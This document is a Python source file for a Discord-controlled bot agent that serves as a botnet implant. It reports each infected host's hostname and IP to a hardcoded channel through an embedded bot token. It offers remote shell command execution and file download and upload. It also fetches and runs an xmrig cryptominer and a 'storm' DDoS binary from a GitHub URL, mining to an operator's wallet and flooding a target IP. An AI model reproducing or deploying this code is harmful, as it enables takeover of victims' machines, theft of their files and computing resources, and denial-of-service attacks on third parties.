from discord.ext import commands
import requests, discord, urllib, psutil, socket, sys, os

token = 'MTAzNzY3ODY2ODA5ODU4ODY3Mg.Ga_BmW.GO4anOENXODo3S19Xl-IGx67mm_FM72e8V7m3s' # Token
channel_id = 1002498477927977053  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get("https://sheesh.rip/ip").headers['IP']
hostname = socket.gethostname()
#os.chdir("/tmp")

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f"{bot.user}")
    await channel.send(f"``[+] {hostname}@{ip}: Session opened``")
    

# ----- Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {hostname}@{ip}``")
    
# info
@bot.command(name=f"info.{hostname}@{ip}")
async def ipinfo(ctx):
    link = "https://sheesh.rip/ip"
    f = requests.get(link)
    await ctx.send(f"``[+] {hostname}@{ip}: IP Information`` ```json\n{f.text}```")
    
# check
@bot.command()
async def check(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: Miner not running``")
    
    if "storm" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {hostname}@{ip}: DDoS running``")
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: DDoS not running``")
    
# shell
@bot.command(name=f"shell.{hostname}@{ip}")
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {hostname}@{ip}: Command executed``")
    else:
        await ctx.send(f"``[+] {hostname}@{ip}: Command executed`` ```sh\n{output}```")
    
# download
@bot.command(name=f"download.{hostname}@{ip}")
async def download(ctx, arg1, arg2):
    link = ''.join(arg1)
    name = ''.join(arg2)
    
    url = link
    r = requests.get(url, allow_redirects=True)
    open(name, 'wb').write(r.content)
    
    if os.path.exists(name):
        await ctx.send(f"``[+] {hostname}@{ip}: File downloaded``")
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: File not downloaded``")
    
# upload
@bot.command(name=f"upload.{hostname}@{ip}")
async def upload(ctx, arg1):
    path = ''.join(arg1)
    await ctx.send(f"``[+] {hostname}@{ip}: File uploaded``",file=discord.File(path))
    
# stop all
@bot.command(name=f"stopall.{hostname}@{ip}")
async def stopall(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill storm")
        await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
        
    if "storm" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill storm")
        await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
    
# ddos
@bot.command()
async def ddos(ctx, ddosarg):
    if not os.path.exists("storm"):
        url = "https://github.com/rxu7s/Public/raw/main/storm"
        r = requests.get(url, allow_redirects=True)
        open("storm", 'wb').write(r.content)
        
    ddosip = ''.join(ddosarg)
    os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
    await ctx.send(f"``[+] {hostname}@{ip}: DDoS started to {ddosip}``")
    
# stop ddos
@bot.command()
async def stopddos(ctx):
    if "storm" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill storm")
        await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
    
# miner
@bot.command()
async def miner(ctx, walletArg):
    if not os.path.exists("xmrig"):
        url = "https://github.com/rxu7s/Public/raw/main/xmrig"
        r = requests.get(url, allow_redirects=True)
        open("xmrig", 'wb').write(r.content)
    
    wallet = ''.join(walletArg)
    os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
    await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
    
# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill xmrig")
        await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
    

bot.run(token)